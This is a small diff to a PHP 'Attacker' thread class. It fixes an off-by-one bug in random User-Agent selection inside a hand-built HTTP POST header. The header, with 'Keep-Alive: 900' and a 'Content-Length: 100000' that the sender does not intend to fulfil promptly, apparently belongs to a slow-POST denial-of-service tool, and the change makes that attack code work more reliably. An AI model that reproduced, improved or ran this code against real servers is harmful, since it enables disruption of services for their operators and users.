@@ -39,7 +39,7 @@ class Attacker extends \Thread
     $this->chars = basic_chars();
     $this->header = "POST / HTTP/1.1\r\n".
                    "Host: ".$this->host."\r\n".
-                   "User-Agent: ".self::$useragents[mt_rand(0,count(self::$useragents))]."\r\n".
+                   "User-Agent: ".self::$useragents[mt_rand(0,count(self::$useragents)-1)]."\r\n".
                    "Connection: keep-alive\r\n".
                    "Keep-Alive: 900\r\n".
                    "Content-Length: 100000\r\n".
